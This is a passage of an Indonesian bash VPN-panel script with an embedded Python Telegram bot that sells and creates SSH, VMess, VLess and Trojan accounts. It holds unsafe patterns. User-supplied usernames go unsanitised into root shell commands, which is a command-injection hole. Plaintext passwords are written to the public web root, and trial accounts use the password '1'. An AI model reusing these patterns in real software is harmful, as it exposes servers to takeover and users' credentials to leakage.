    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    printf "  ${WHITE}%-16s${NC} : ${YELLOW}%s${NC}\n"    "Aktif Selama"  "$days"



    printf "  ${WHITE}%-16s${NC} : %s\n"                   "Dibuat Pada"   "$created"



    printf "  ${WHITE}%-16s${NC} : ${RED}%s${NC}\n"        "Berakhir Pada" "$exp"



    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"



    echo ""



    # QR Code jika qrencode tersedia



    if command -v qrencode >/dev/null 2>&1; then



        echo -e "  ${CYAN}[q]${NC} Tampilkan QR Code SSH  ${CYAN}[Enter]${NC} Lanjut"



        read -rp "  " qr_choice



        if [[ "$qr_choice" == "q" || "$qr_choice" == "Q" ]]; then



            clear



            echo -e "  ${YELLOW}QR Code — SSH Import:${NC}"



            echo ""



            local qr_data="${DOMAIN}:80@${username}:${password}"



            qrencode -t ANSIUTF8 "$qr_data" 2>/dev/null || echo -e "  ${RED}QR gagal${NC}"



            echo ""; read -rp "  Tekan Enter..."; clear



        fi



    fi



}







#================================================



# INSTALL QRENCODE (dipanggil saat buat akun pertama)



#================================================







_ensure_qrencode() {



    command -v qrencode >/dev/null 2>&1 && return 0



    apt-get install -y qrencode >/dev/null 2>&1 && return 0



    return 1



}







delete_account() {



    local protocol="$1"



    clear; print_menu_header "DELETE ${protocol^^}"



    shopt -s nullglob



    local files=("$AKUN_DIR"/${protocol}-*.txt)



    shopt -u nullglob



    if [[ ${#files[@]} -eq 0 ]]; then echo -e "  ${RED}No accounts!${NC}"; sleep 2; return; fi



    for f in "${files[@]}"; do



        local n e



        n=$(basename "$f" .txt | sed "s/${protocol}-//")



        e=$(grep "EXPIRED" "$f" 2>/dev/null | cut -d= -f2-)



        echo -e "  ${CYAN}▸${NC} $n ${YELLOW}($e)${NC}"



    done



    echo ""



    read -rp "  Username to delete: " username



    [[ -z "$username" ]] && return



    if [[ -n "$username" ]]; then



        local tmp; tmp=$(mktemp)



        jq --arg email "$username" \
           'del(.inbounds[].settings.clients[]? | select(.email == $email))' \
           "$XRAY_CONFIG" > "$tmp" 2>/dev/null



        if jq empty "$tmp" 2>/dev/null && [[ -s "$tmp" ]]; then



            mv "$tmp" "$XRAY_CONFIG"



        else



            rm -f "$tmp"



        fi



        fix_xray_permissions



        if xray -test -config "$XRAY_CONFIG" >/dev/null 2>&1; then



            systemctl restart xray 2>/dev/null



        fi



        rm -f "$AKUN_DIR/${protocol}-${username}.txt"



        rm -f "$PUBLIC_HTML/${protocol}-${username}.txt"



        [[ "$protocol" == "ssh" ]] && userdel -f "$username" 2>/dev/null



        echo -e "  ${GREEN}✔ Deleted: ${username}${NC}"



        sleep 2



    fi



}







renew_account() {



    local protocol="$1"



    clear; print_menu_header "RENEW ${protocol^^}"



    shopt -s nullglob



    local files=("$AKUN_DIR"/${protocol}-*.txt)



    shopt -u nullglob



    if [[ ${#files[@]} -eq 0 ]]; then echo -e "  ${RED}No accounts!${NC}"; sleep 2; return; fi



    for f in "${files[@]}"; do



        local n e



        n=$(basename "$f" .txt | sed "s/${protocol}-//")



        e=$(grep "EXPIRED" "$f" 2>/dev/null | cut -d= -f2-)



        echo -e "  ${CYAN}▸${NC} $n ${YELLOW}($e)${NC}"



    done



    echo ""



    read -rp "  Username to renew: " username



    [[ -z "$username" ]] && return



    [[ ! -f "$AKUN_DIR/${protocol}-${username}.txt" ]] && { echo -e "  ${RED}✘ Not found!${NC}"; sleep 2; return; }



    read -rp "  Add days: " days



    [[ ! "$days" =~ ^[0-9]+$ ]] && { echo -e "  ${RED}✘ Invalid!${NC}"; sleep 2; return; }



    local new_exp new_exp_date current_exp



    current_exp=$(grep "EXPIRED" "$AKUN_DIR/${protocol}-${username}.txt" 2>/dev/null | cut -d= -f2-)



    if [[ -n "$current_exp" ]]; then



        new_exp=$(date -d "${current_exp} + ${days} days" +"%d %b, %Y" 2>/dev/null)



        new_exp_date=$(date -d "${current_exp} + ${days} days" +"%Y-%m-%d" 2>/dev/null)



    fi



    [[ -z "$new_exp" ]] && new_exp=$(date -d "+${days} days" +"%d %b, %Y")



    [[ -z "$new_exp_date" ]] && new_exp_date=$(date -d "+${days} days" +"%Y-%m-%d")



    sed -i "s/EXPIRED=.*/EXPIRED=${new_exp}/" "$AKUN_DIR/${protocol}-${username}.txt"



    [[ "$protocol" == "ssh" ]] && chage -E "$new_exp_date" "$username" 2>/dev/null



    echo -e "  ${GREEN}✔ Renewed! Exp: ${new_exp}${NC}"



    sleep 3



}







list_accounts() {



    local protocol="$1"



    clear



    local W; W=$(get_width)



    shopt -s nullglob



    local files=("$AKUN_DIR"/${protocol}-*.txt)



    shopt -u nullglob



    _box_top $W



    _box_center $W "${YELLOW}${BOLD}${protocol^^} ACCOUNT LIST${NC}"



    _box_divider $W



    if [[ ${#files[@]} -eq 0 ]]; then



        _box_center $W "${RED}Tidak ada akun!${NC}"



        _box_bottom $W



        echo ""; sleep 2; return



    fi



    _box_row $W "USERNAME" "EXPIRED / QUOTA / TYPE"



    _box_divider $W



    for f in "${files[@]}"; do



        local uname exp quota trial ttype



        uname=$(basename "$f" .txt | sed "s/${protocol}-//")



        exp=$(grep "EXPIRED" "$f" 2>/dev/null | cut -d= -f2-)



        quota=$(grep "QUOTA" "$f" 2>/dev/null | cut -d= -f2)



        trial=$(grep "TRIAL" "$f" 2>/dev/null | cut -d= -f2)



        ttype="Member"; [[ "$trial" == "1" ]] && ttype="Trial"



        _box_row $W "${uname}" "${exp}  ${quota:-?}GB  ${ttype}"



    done



    _box_divider $W



    _box_left $W "Total: ${GREEN}${#files[@]}${NC} akun"



    _box_bottom $W



    echo ""



    read -rp "  Tekan Enter untuk kembali..."



}







check_user_login() {



    local protocol="$1"



    clear; print_menu_header "ACTIVE ${protocol^^} LOGINS"



    if [[ "$protocol" == "ssh" ]]; then



        echo -e "  ${WHITE}Active SSH sessions:${NC}"



        who 2>/dev/null || echo "  None"



        echo ""



        echo -e "  ${WHITE}Login count:${NC}"



        who 2>/dev/null | awk '{print $1}' | sort | uniq -c | sort -rn



    else



        echo -e "  ${WHITE}Xray ${protocol^^} log:${NC}"



        if [[ -f /var/log/xray/access.log ]]; then



            grep -i "$protocol" /var/log/xray/access.log 2>/dev/null | tail -20 || echo "  No data"



        else



            echo "  No log"



        fi



    fi



    echo ""



    read -rp "  Press any key to back..."



}







#================================================



# SETUP TELEGRAM BOT (vpn-bot)



#================================================







setup_telegram_bot() {



    clear



    print_menu_header "SETUP TELEGRAM BOT"



    echo -e "  ${YELLOW}Cara mendapatkan Bot Token:${NC}"



    echo -e "  1. Buka Telegram cari ${WHITE}@BotFather${NC}"



    echo -e "  2. Ketik /newbot ikuti instruksi"



    echo -e "  3. Copy TOKEN yang diberikan"



    echo ""



    echo -e "  ${YELLOW}Cara mendapatkan Chat ID:${NC}"



    echo -e "  1. Cari ${WHITE}@userinfobot${NC} di Telegram"



    echo -e "  2. Ketik /start lihat ID kamu"



    echo ""



    read -rp "  Bot Token     : " bot_token



    [[ -z "$bot_token" ]] && { echo -e "  ${RED}✘ Token required!${NC}"; sleep 2; return; }



    read -rp "  Admin Chat ID : " admin_id



    [[ -z "$admin_id" ]] && { echo -e "  ${RED}✘ Chat ID required!${NC}"; sleep 2; return; }



    echo -e "  ${CYAN}Testing token...${NC}"



    local test_result bot_name



    test_result=$(curl -s --max-time 10 "https://api.telegram.org/bot${bot_token}/getMe")



    if ! echo "$test_result" | grep -q '"ok":true'; then



        echo -e "  ${RED}✘ Token tidak valid!${NC}"; sleep 2; return



    fi



    bot_name=$(echo "$test_result" | python3 -c "



import sys,json



d=json.load(sys.stdin)



print(d['result']['username'])



" 2>/dev/null)



    echo -e "  ${GREEN}✔ Bot valid! @${bot_name}${NC}"



    echo ""



    read -rp "  Nama Pemilik Rekening : " rek_name



    read -rp "  Nomor Rek/Dana/GoPay  : " rek_number



    read -rp "  Bank / E-Wallet       : " rek_bank



    read -rp "  Harga per Bulan (Rp)  : " harga



    [[ ! "$harga" =~ ^[0-9]+$ ]] && harga=10000







    echo "$bot_token" > "$BOT_TOKEN_FILE"



    echo "$admin_id"  > "$CHAT_ID_FILE"



    chmod 600 "$BOT_TOKEN_FILE" "$CHAT_ID_FILE"







    cat > "$PAYMENT_FILE" << PAYEOF



REK_NAME=${rek_name}



REK_NUMBER=${rek_number}



REK_BANK=${rek_bank}



HARGA=${harga}



PAYEOF



    chmod 600 "$PAYMENT_FILE"

    # Pastikan Python3 tersedia sebelum install bot service
    command -v python3 >/dev/null 2>&1 || {
        echo -e "  ${CYAN}Installing Python3...${NC}"
        apt-get install -y python3 python3-pip >/dev/null 2>&1 || true
    }

    _install_bot_service



    sleep 2



    if systemctl is-active --quiet vpn-bot; then



        echo -e "  ${GREEN}✔ Bot aktif! @${bot_name}${NC}"



        curl -s -X POST \
            "https://api.telegram.org/bot${bot_token}/sendMessage" \
            -d chat_id="$admin_id" \
            -d text="✅ Youzin Crabz Tunel Bot Aktif!



Domain: ${DOMAIN}



Powered by The Professor" \
            -d parse_mode="HTML" \
            --max-time 10 >/dev/null 2>&1



    else



        echo -e "  ${RED}✘ Bot gagal start!${NC}"



        journalctl -u vpn-bot -n 10 --no-pager



    fi



    echo ""



    read -rp "  Press any key to back..."



}







#================================================



# INSTALL BOT SERVICE (vpn-bot)



# Link gRPC diupdate ke port 443



#================================================







_install_bot_service() {



    mkdir -p /root/bot "$ORDER_DIR"



    pip_install requests







    cat > /root/bot/bot.py << 'BOTEOF'



#!/usr/bin/env python3



# -*- coding: utf-8 -*-



import os, json, time, subprocess



import threading



from datetime import datetime, timedelta







try:



    import requests



    from requests.adapters import HTTPAdapter



    from urllib3.util.retry import Retry



except ImportError:



    os.system('pip3 install requests --break-system-packages -q')



    import requests



    from requests.adapters import HTTPAdapter



    from urllib3.util.retry import Retry







TOKEN     = open('/root/.bot_token').read().strip()



ADMIN_ID  = int(open('/root/.chat_id').read().strip())



DOMAIN    = open('/root/domain').read().strip() if os.path.exists('/root/domain') else 'N/A'



ORDER_DIR = '/root/orders'



AKUN_DIR  = '/root/akun'



HTML_DIR  = '/var/www/html'



API       = f'https://api.telegram.org/bot{TOKEN}'







os.makedirs(ORDER_DIR, exist_ok=True)



os.makedirs(AKUN_DIR,  exist_ok=True)



os.makedirs(HTML_DIR,  exist_ok=True)







user_state = {}



state_lock = threading.Lock()







def make_session():



    s = requests.Session()



    retry = Retry(total=2, backoff_factor=0.3, status_forcelist=[500,502,503,504])



    adapter = HTTPAdapter(max_retries=retry, pool_connections=20, pool_maxsize=50)



    s.mount('https://', adapter)



    s.mount('http://', adapter)



    return s







SESSION = make_session()







def get_payment():



    info = {'REK_NAME':'N/A','REK_NUMBER':'N/A','REK_BANK':'N/A','HARGA':'10000'}



    try:



        with open('/root/.payment_info') as f:



            for line in f:



                line = line.strip()



                if '=' in line:



                    k,v = line.split('=',1)



                    info[k.strip()] = v.strip()



    except: pass



    return info







def api_post(method, data, timeout=6):



    try:



        r = SESSION.post(f'{API}/{method}', data=data, timeout=timeout)



        return r.json()



    except Exception as e:



        print(f'API {method}: {e}', flush=True)



        return {}







def send(chat_id, text, markup=None, parse_mode='HTML'):



    data = {'chat_id':chat_id,'text':text,'parse_mode':parse_mode}



    if markup: data['reply_markup'] = json.dumps(markup)



    return api_post('sendMessage', data)







def answer_cb(cb_id, text='', alert=False):



    api_post('answerCallbackQuery', {'callback_query_id':cb_id,'text':text,'show_alert':alert})







def get_updates(offset=0):



    try:



        r = SESSION.get(f'{API}/getUpdates', params={'offset':offset,'timeout':15,'limit':100}, timeout=20)



        return r.json().get('result', [])



    except: return []







def kb_main():



    return {'keyboard':[



        ['🆓 Trial Gratis','🛒 Order VPN'],



        ['📋 Cek Akun Saya','ℹ️ Info Server'],



        ['❓ Bantuan','📞 Hubungi Admin']



    ],'resize_keyboard':True,'one_time_keyboard':False}







def kb_trial():



    return {'inline_keyboard':[



        [{'text':'🔵 SSH','callback_data':'trial_ssh'},{'text':'🟢 VMess','callback_data':'trial_vmess'}],



        [{'text':'🟡 VLess','callback_data':'trial_vless'},{'text':'🔴 Trojan','callback_data':'trial_trojan'}],



        [{'text':'◀️ Kembali','callback_data':'back_main'}]



    ]}







def kb_order():



    return {'inline_keyboard':[



        [{'text':'🔵 SSH','callback_data':'order_ssh'},{'text':'🟢 VMess','callback_data':'order_vmess'}],



        [{'text':'🟡 VLess','callback_data':'order_vless'},{'text':'🔴 Trojan','callback_data':'order_trojan'}],



        [{'text':'◀️ Kembali','callback_data':'back_main'}]



    ]}







def kb_confirm(order_id):



    return {'inline_keyboard':[[



        {'text':'✅ Konfirmasi','callback_data':f'confirm_{order_id}'},



        {'text':'❌ Tolak','callback_data':f'reject_{order_id}'}



    ]]}







def kb_cancel():



    return {'inline_keyboard':[[{'text':'❌ Batalkan','callback_data':'cancel_order'}]]}







def get_ip():



    for url in ['https://ifconfig.me','https://ipinfo.io/ip','https://api.ipify.org']:



        try:



            r = SESSION.get(url, timeout=3)



            if r.status_code == 200: return r.text.strip()



        except: pass



    return 'N/A'







def run_cmd(cmd):



    try:



        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=90)



        return r.stdout.strip()



    except Exception as e:



        print(f'CMD: {e}', flush=True)



        return ''







def save_order(oid, data):



    with open(f'{ORDER_DIR}/{oid}.json','w') as f: json.dump(data, f, indent=2)







def load_order(oid):



    p = f'{ORDER_DIR}/{oid}.json'



    if not os.path.exists(p): return None



    with open(p) as f: return json.load(f)







def get_pending():



    orders = []



    if not os.path.exists(ORDER_DIR): return orders



    for fn in os.listdir(ORDER_DIR):



        if not fn.endswith('.json'): continue



        try:



            with open(f'{ORDER_DIR}/{fn}') as f: d = json.load(f)



            if d.get('status') == 'pending': orders.append(d)



        except: pass



    return orders







def make_ssh(username, password, days=30):



    exp_date = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d')



    exp_str  = (datetime.now() + timedelta(days=days)).strftime('%d %b, %Y')



    created  = datetime.now().strftime('%d %b, %Y')



    run_cmd(f'useradd -M -s /bin/false -e {exp_date} {username} 2>/dev/null')



    run_cmd(f'echo "{username}:{password}" | chpasswd')



    with open(f'{AKUN_DIR}/ssh-{username}.txt','w') as f:



        f.write(f'USERNAME={username}\nPASSWORD={password}\nIPLIMIT=1\nEXPIRED={exp_str}\nCREATED={created}\n')



    ip = get_ip()



    with open(f'{HTML_DIR}/ssh-{username}.txt','w') as f:



        f.write(f'YOUZIN CRABZ TUNEL - SSH\nUsername: {username}\nPassword: {password}\nExpired: {exp_str}\n')



    return exp_str, ip







def make_xray(protocol, username, days=30, quota=100):



    import uuid as uuidlib, base64



    uid      = str(uuidlib.uuid4())



    exp_str  = (datetime.now() + timedelta(days=days)).strftime('%d %b, %Y')



    created  = datetime.now().strftime('%d %b, %Y')



    cfg      = '/usr/local/etc/xray/config.json'



    if protocol == 'vmess':



        cmd = f'jq --arg uuid "{uid}" --arg email "{username}" \'(.inbounds[] | select(.tag | startswith("vmess")).settings.clients) += [{{"id":$uuid,"email":$email,"alterId":0}}]\' {cfg} > /tmp/xr.json && mv /tmp/xr.json {cfg}'



    elif protocol == 'vless':



        cmd = f'jq --arg uuid "{uid}" --arg email "{username}" \'(.inbounds[] | select(.tag | startswith("vless")).settings.clients) += [{{"id":$uuid,"email":$email}}]\' {cfg} > /tmp/xr.json && mv /tmp/xr.json {cfg}'



    elif protocol == 'trojan':



        cmd = f'jq --arg password "{uid}" --arg email "{username}" \'(.inbounds[] | select(.tag | startswith("trojan")).settings.clients) += [{{"password":$password,"email":$email}}]\' {cfg} > /tmp/xr.json && mv /tmp/xr.json {cfg}'



    run_cmd(cmd)



    run_cmd(f'chmod 644 {cfg}')



    run_cmd('systemctl restart xray 2>/dev/null || true')



    with open(f'{AKUN_DIR}/{protocol}-{username}.txt','w') as f:



        f.write(f'UUID={uid}\nQUOTA={quota}\nIPLIMIT=1\nEXPIRED={exp_str}\nCREATED={created}\n')



    ip = get_ip()



    # TLS=443, NonTLS=80, gRPC=443



    if protocol == 'vmess':



        j_tls = f'{{"v":"2","ps":"{username}","add":"bug.com","port":"443","id":"{uid}","aid":"0","net":"ws","path":"/{protocol}","type":"none","host":"{DOMAIN}","tls":"tls"}}'



        link_tls  = "vmess://" + base64.b64encode(j_tls.encode()).decode()



        j_ntls = f'{{"v":"2","ps":"{username}","add":"bug.com","port":"80","id":"{uid}","aid":"0","net":"ws","path":"/{protocol}","type":"none","host":"{DOMAIN}","tls":"none"}}'



        link_ntls = "vmess://" + base64.b64encode(j_ntls.encode()).decode()



        j_grpc = f'{{"v":"2","ps":"{username}","add":"{DOMAIN}","port":"443","id":"{uid}","aid":"0","net":"grpc","path":"{protocol}-grpc","type":"none","host":"bug.com","tls":"tls"}}'



        link_grpc = "vmess://" + base64.b64encode(j_grpc.encode()).decode()



    elif protocol == 'vless':



        link_tls  = f"vless://{uid}@bug.com:443?path=%2F{protocol}&security=tls&encryption=none&host={DOMAIN}&type=ws&sni={DOMAIN}#{username}-TLS"



        link_ntls = f"vless://{uid}@bug.com:80?path=%2F{protocol}&security=none&encryption=none&host={DOMAIN}&type=ws#{username}-NonTLS"



        link_grpc = f"vless://{uid}@{DOMAIN}:443?mode=gun&security=tls&encryption=none&type=grpc&serviceName={protocol}-grpc&sni=bug.com#{username}-gRPC"



    elif protocol == 'trojan':



        link_tls  = f"trojan://{uid}@bug.com:443?path=%2F{protocol}&security=tls&host={DOMAIN}&type=ws&sni={DOMAIN}#{username}-TLS"



        link_ntls = f"trojan://{uid}@bug.com:80?path=%2F{protocol}&security=none&host={DOMAIN}&type=ws#{username}-NonTLS"



        link_grpc = f"trojan://{uid}@{DOMAIN}:443?mode=gun&security=tls&type=grpc&serviceName={protocol}-grpc&sni=bug.com#{username}-gRPC"



    return (uid, exp_str, ip, link_tls, link_ntls, link_grpc)







def fmt_ssh_msg(username, password, ip, exp_str, title, durasi="30 Hari"):



    return f'''✅ <b>{title}</b>



━━━━━━━━━━━━━━━━━━━━━━━━━



👤 Username : <code>{username}</code>



🔑 Password : <code>{password}</code>



🌐 Domain   : <code>{DOMAIN}</code>



🖥️ IP VPS   : <code>{ip}</code>



━━━━━━━━━━━━━━━━━━━━━━━━━



⏰ Aktif    : {durasi}



📅 Expired  : {exp_str}



━━━━━━━━━━━━━━━━━━━━━━━━━



<i>The Professor</i>'''







def fmt_xray_msg(protocol, username, uid, ip, exp_str, link_tls, link_ntls, link_grpc, title, durasi="30 Hari"):



    return f'''✅ <b>{title}</b>



━━━━━━━━━━━━━━━━━━━━━━━━━



👤 Username : <code>{username}</code>



🔑 UUID     : <code>{uid}</code>



🌐 Domain   : <code>{DOMAIN}</code>



🖥️ IP VPS   : <code>{ip}</code>



━━━━━━━━━━━━━━━━━━━━━━━━━



🔗 <b>Link TLS (443):</b>



<code>{link_tls}</code>



━━━━━━━━━━━━━━━━━━━━━━━━━



🔗 <b>Link NonTLS (80):</b>



<code>{link_ntls}</code>



━━━━━━━━━━━━━━━━━━━━━━━━━



🔗 <b>Link gRPC (443):</b>



<code>{link_grpc}</code>



━━━━━━━━━━━━━━━━━━━━━━━━━



⏰ Aktif  : {durasi}



📅 Expired: {exp_str}



━━━━━━━━━━━━━━━━━━━━━━━━━



<i>The Professor</i>'''







def do_trial(protocol, chat_id):



    ts = datetime.now().strftime('%H%M%S')



    username = f'trial-{ts}'



    ip = get_ip()



    exp_1h = (datetime.now() + timedelta(hours=1)).strftime('%d %b %Y %H:%M')



    if protocol == 'ssh':



        password = '1'



        exp_date = (datetime.now() + timedelta(days=1)).strftime('%Y-%m-%d')



        run_cmd(f'useradd -M -s /bin/false -e {exp_date} {username} 2>/dev/null')



        run_cmd(f'echo "{username}:{password}" | chpasswd')



        run_cmd(f'(sleep 3600; userdel -f {username} 2>/dev/null; rm -f {AKUN_DIR}/ssh-{username}.txt {HTML_DIR}/ssh-{username}.txt) & disown')



        msg = fmt_ssh_msg(username, password, ip, exp_1h, 'Trial SSH Berhasil! 🆓', '1 Jam (Auto Hapus)')



        msg += '\n⚠️ <i>Auto hapus setelah 1 jam</i>'



        send(chat_id, msg, markup=kb_main())



    else:



        try:



            uid, _, ip, link_tls, link_ntls, link_grpc = make_xray(protocol, username, days=1, quota=1)



        except Exception as e:



            send(chat_id, f'❌ Gagal buat akun: {e}'); return



        del_cmd = f'(sleep 3600; exec 200>/root/.xray_config.lock; flock -w 10 200 || exit 1; jq --arg email "{username}" \'del(.inbounds[].settings.clients[]? | select(.email == $email))\' /usr/local/etc/xray/config.json > /tmp/xd.json && mv /tmp/xd.json /usr/local/etc/xray/config.json; chmod 644 /usr/local/etc/xray/config.json; kill -SIGHUP $(pgrep xray) 2>/dev/null || systemctl restart xray; flock -u 200; rm -f {AKUN_DIR}/{protocol}-{username}.txt {HTML_DIR}/{protocol}-{username}.txt) & disown'



        run_cmd(del_cmd)



        msg = fmt_xray_msg(protocol, username, uid, ip, exp_1h, link_tls, link_ntls, link_grpc, f'Trial {protocol.upper()} Berhasil! 🆓', '1 Jam (Auto Hapus)')



        msg += '\n⚠️ <i>Auto hapus setelah 1 jam</i>'



        send(chat_id, msg, markup=kb_main())







def fmt_payment(order):



    pay = get_payment()



    harga = int(pay.get('HARGA', 10000))



    return f'''🛒 <b>Detail Order - Youzin Crabz Tunel</b>



🆔 Order ID : <code>{order["order_id"]}</code>



📦 Paket    : {order["protocol"].upper()} 30 Hari



👤 Username : <code>{order["username"]}</code>



💰 Nominal  : <b>Rp {harga:,}</b>



<i>Transfer lalu kirim bukti ke admin</i>'''







def deliver_account(chat_id, protocol, username):



    import random, string



    try:



        if protocol == 'ssh':



            password = ''.join(random.choices(string.ascii_letters + string.digits, k=8))



            exp_str, ip = make_ssh(username, password, days=30)



            msg = fmt_ssh_msg(username, password, ip, exp_str, 'Akun SSH Berhasil! ✅')



        else:



            uid, exp_str, ip, link_tls, link_ntls, link_grpc = make_xray(protocol, username, days=30, quota=100)



            msg = fmt_xray_msg(protocol, username, uid, ip, exp_str, link_tls, link_ntls, link_grpc, f'Akun {protocol.upper()} Berhasil! ✅')



        msg += '\n💰 Terima kasih! 🙏'



        send(chat_id, msg, markup=kb_main())



        return True, msg



    except Exception as e:



        return False, str(e)







def on_start(msg):



    chat_id = msg['chat']['id']



    fname = msg['from'].get('first_name','User')



    send(chat_id, f'👋 Halo <b>{fname}</b>!\n\n🤖 <b>Youzin Crabz Tunel Bot</b>\n🌐 Server: <code>{DOMAIN}</code>\n<i>Powered by The Professor</i>\n\nPilih menu 👇', markup=kb_main())







def on_help(msg):



    chat_id = msg['chat']['id']



    send(chat_id, '❓ <b>PANDUAN BOT</b>\n\n🆓 Trial → Akun 1 jam gratis\n🛒 Order → Beli akun 30 hari\n📋 Cek → Lihat akun aktif\nℹ️ Info → Port & domain', markup=kb_main())







def on_info(msg):



    chat_id = msg['chat']['id']



    ip = get_ip()



    send(chat_id, f'ℹ️ <b>INFO SERVER</b>\n🌐 Domain : <code>{DOMAIN}</code>\n🖥️ IP VPS : <code>{ip}</code>\n🔌 SSH: 22 | Dropbear: 222\n🔌 TLS: 443 | NonTLS: 80 | gRPC: 443', markup=kb_main())







def on_cek_akun(msg):



    chat_id = msg['chat']['id']



    found = []



    if not os.path.exists(ORDER_DIR):



        send(chat_id, '📋 Tidak ada akun aktif.', markup=kb_main()); return



    for fn in os.listdir(ORDER_DIR):



        if not fn.endswith('.json'): continue



        try:



            with open(f'{ORDER_DIR}/{fn}') as f: order = json.load(f)



            if str(order.get('chat_id')) == str(chat_id) and order.get('status') == 'confirmed':



                found.append(order)



        except: pass



    if not found:



        send(chat_id, '📋 Tidak ada akun aktif.\nGunakan 🛒 Order VPN.', markup=kb_main()); return



    text = '📋 <b>Akun Aktif Kamu</b>\n━━━━━━━━━━━━━━━━━━━━━━━━━\n'



    for a in found: text += f'📦 {a["protocol"].upper()} → {a["username"]}\n'



    send(chat_id, text, markup=kb_main())







def on_contact(msg):



    chat_id = msg['chat']['id']



    fname = msg['from'].get('first_name','User')



    uname = msg['from'].get('username','')



    send(chat_id, '📞 Pesan diteruskan ke admin.', markup=kb_main())



    send(ADMIN_ID, f'📞 <b>User butuh bantuan!</b>\n👤 {fname}\n📱 @{uname}\n🆔 <code>{chat_id}</code>')







def on_callback(cb):



    chat_id = cb['message']['chat']['id']



    cb_id   = cb['id']



    data    = cb['data']



    uname   = cb['from'].get('username','')



    fname   = cb['from'].get('first_name','User')



    answer_cb(cb_id)



    if data.startswith('trial_'):



        protocol = data.replace('trial_','')



        send(chat_id, f'⏳ Membuat trial {protocol.upper()}...')



        threading.Thread(target=do_trial, args=(protocol, chat_id), daemon=True).start()



    elif data.startswith('order_'):



        protocol = data.replace('order_','')



        with state_lock: user_state[chat_id] = {'step':'wait_username','protocol':protocol}



        send(chat_id, f'🛒 <b>Order {protocol.upper()}</b>\n✏️ Ketik username (3-20 karakter):', markup=kb_cancel())



    elif data == 'cancel_order':



        with state_lock: user_state.pop(chat_id, None)



        send(chat_id, '❌ Order dibatalkan.', markup=kb_main())



    elif data == 'back_main':



        send(chat_id, '🏠 Menu Utama', markup=kb_main())



    elif data.startswith('confirm_') and chat_id == ADMIN_ID:



        oid = data.replace('confirm_','')



        order = load_order(oid)



        if not order: send(ADMIN_ID,'❌ Order tidak ada!'); return



        if order.get('status') != 'pending': send(ADMIN_ID,'⚠️ Sudah diproses!'); return



        send(ADMIN_ID,'⏳ Membuat akun...')



        def do_confirm():



            ok, result = deliver_account(order['chat_id'], order['protocol'], order['username'])



            if ok:



                order['status'] = 'confirmed'



                save_order(oid, order)



                send(ADMIN_ID, f'✅ Akun dikirim ke @{order.get("tg_user","?")}')



            else: send(ADMIN_ID, f'❌ Gagal: {result}')



        threading.Thread(target=do_confirm, daemon=True).start()



    elif data.startswith('reject_') and chat_id == ADMIN_ID:



        oid = data.replace('reject_','')



        order = load_order(oid)



        if not order: send(ADMIN_ID,'❌ Tidak ada!'); return



        order['status'] = 'rejected'



        save_order(oid, order)



        send(order['chat_id'], '❌ Order ditolak. Hubungi admin.', markup=kb_main())



        send(ADMIN_ID, f'❌ Order ditolak.')







def on_msg(msg):



    if 'text' not in msg: return



    chat_id = msg['chat']['id']



    text    = msg['text'].strip()



    with state_lock: state = user_state.get(chat_id, {})



    if state.get('step') == 'wait_username':



        new_u = text.strip().replace(' ','_')



        if len(new_u) < 3 or len(new_u) > 20:



            send(chat_id, '❌ Username 3-20 karakter!', markup=kb_cancel()); return



        protocol = state['protocol']



        oid = f'{chat_id}_{int(time.time())}'



        order = {'order_id':oid,'chat_id':chat_id,'username':new_u,'protocol':protocol,



                 'status':'pending','created_at':datetime.now().isoformat(),



                 'tg_user':msg['from'].get('username',''),'tg_name':msg['from'].get('first_name','')}



        save_order(oid, order)



        with state_lock: user_state.pop(chat_id, None)



        send(chat_id, fmt_payment(order))



        pay = get_payment(); harga = int(pay.get('HARGA',10000))



        send(ADMIN_ID, f'🔔 <b>ORDER BARU!</b>\n🆔 {oid}\n📦 {protocol.upper()}\n👤 <code>{new_u}</code>\n📱 @{msg["from"].get("username","")}\n💰 Rp {harga:,}', markup=kb_confirm(oid))



        return



    if text in ['/start','🏠 Menu']: on_start(msg)



    elif text in ['/help','❓ Bantuan']: on_help(msg)



    elif text == '🆓 Trial Gratis': send(chat_id, '🆓 <b>Trial Gratis 1 Jam</b>\nPilih protocol:', markup=kb_trial())



    elif text == '🛒 Order VPN': send(chat_id, '🛒 <b>Order VPN 30 Hari</b>\nPilih protocol:', markup=kb_order())



    elif text == '📋 Cek Akun Saya': on_cek_akun(msg)



    elif text == 'ℹ️ Info Server': on_info(msg)



    elif text == '📞 Hubungi Admin': on_contact(msg)







def main():



    print(f'Youzin Crabz Tunel Bot aktif!', flush=True)



    offset = 0; pool = []



    while True:



        try:



            updates = get_updates(offset)



            for upd in updates:



                offset = upd['update_id'] + 1



                t = None



                if 'message' in upd: t = threading.Thread(target=on_msg, args=(upd['message'],), daemon=True)



                elif 'callback_query' in upd: t = threading.Thread(target=on_callback, args=(upd['callback_query'],), daemon=True)



                if t: t.start(); pool.append(t)



            pool = [x for x in pool if x.is_alive()]



        except KeyboardInterrupt: break



        except Exception as e: print(f'Loop: {e}', flush=True); time.sleep(2)







if __name__ == '__main__': main()



BOTEOF







    chmod +x /root/bot/bot.py







    cat > /etc/systemd/system/vpn-bot.service << 'SVCEOF'



[Unit]



Description=Youzin Crabz Tunel Bot



After=network.target







[Service]



Type=simple



ExecStart=/usr/bin/python3 -u /root/bot/bot.py



Restart=always



RestartSec=3



StandardOutput=journal



StandardError=journal



Environment=PYTHONUNBUFFERED=1







[Install]



WantedBy=multi-user.target



SVCEOF







    systemctl daemon-reload



    systemctl enable vpn-bot 2>/dev/null



    systemctl restart vpn-bot 2>/dev/null



    sleep 2



}







#================================================



# MENU TELEGRAM BOT



#================================================







menu_telegram_bot() {



    while true; do



        clear



        print_menu_header "TELEGRAM BOT"



        local bs; bs=$(check_status vpn-bot)



        local cs; [[ "$bs" == "ON" ]] && cs="${GREEN}RUNNING${NC}" || cs="${RED}STOPPED${NC}"



        printf "  VPN-Bot   : ${cs}\n\n"



        echo -e "  ${WHITE}[1]${NC} Setup VPN Bot"



        echo -e "  ${WHITE}[2]${NC} Start / Stop / Restart VPN Bot"



        echo -e "  ${WHITE}[3]${NC} Log VPN Bot"



        echo -e "  ${WHITE}[4]${NC} Order Pending"



        echo -e "  ${WHITE}[5]${NC} Info VPN Bot"



        echo ""



